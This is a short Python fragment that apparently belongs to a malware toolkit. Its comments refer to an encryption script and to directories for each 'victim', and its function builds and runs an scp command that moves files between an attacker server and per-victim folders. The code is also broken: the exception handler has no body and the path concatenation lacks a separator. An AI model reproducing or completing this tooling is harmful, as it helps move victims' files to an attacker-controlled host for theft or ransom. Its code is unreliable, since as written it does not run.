import os

# Below are a few of the strings already defined in wrapper_script, should be copied to encryption script too for server connection
server_username = "username"
server_ip = "1.1.1.1"
local_ip = "0.0.0.0"
path_to_dirs = "/marom/still/noob" # Should be path to dir which contains dirs for each victim

def upload_file(file_path_src):
  # If file pathes start with /file/..., then change [0] to [1]
  root = file_path_src.split("/")[0]
  
  try:
    upload_file_command = "scp " + server_username + "@" + server_ip + ":" + file_path_src + " " + path_to_dirs + root
    os.system(upload_file_command)
  except FileNotFoundError:
    # Directory somehow not yet created
